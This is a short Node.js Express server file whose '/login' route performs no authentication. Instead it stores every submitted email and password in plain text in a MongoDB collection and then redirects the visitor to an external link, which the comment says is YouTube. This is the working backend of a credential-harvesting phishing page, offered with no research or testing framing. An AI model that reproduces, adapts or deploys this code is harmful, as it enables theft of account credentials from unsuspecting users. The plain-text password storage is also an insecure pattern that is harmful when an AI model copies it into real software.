const express = require('express');
const mongoose = require('mongoose');
const fs = require('fs');
require('dotenv').config(); // Load environment variables from .env file

const app = express();

app.use(express.static(__dirname + '/public')); // Serve static files from the current directory

app.use(express.urlencoded({ extended: true })); // Parse form data

mongoose.connect(process.env.DB_CONNECTION_STRING, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('Connected to MongoDB'))
    .catch(err => console.error('Error connecting to MongoDB', err));

const loginSchema = new mongoose.Schema({
    email: String,
    password: String,
    createdAt: { type: Date, default: Date.now }
});

const Login = mongoose.model('Login', loginSchema);

app.post('/login', async (req, res) => {
    const email = req.body.email;
    const password = req.body.password;

    // Save user inputs to MongoDB
    const login = new Login({ email, password });
    await login.save();

    // Redirect to YouTube
    res.redirect(process.env.LINK);
});

app.listen(3000, () => {
    console.log('Server running at http://localhost:3000/');
});
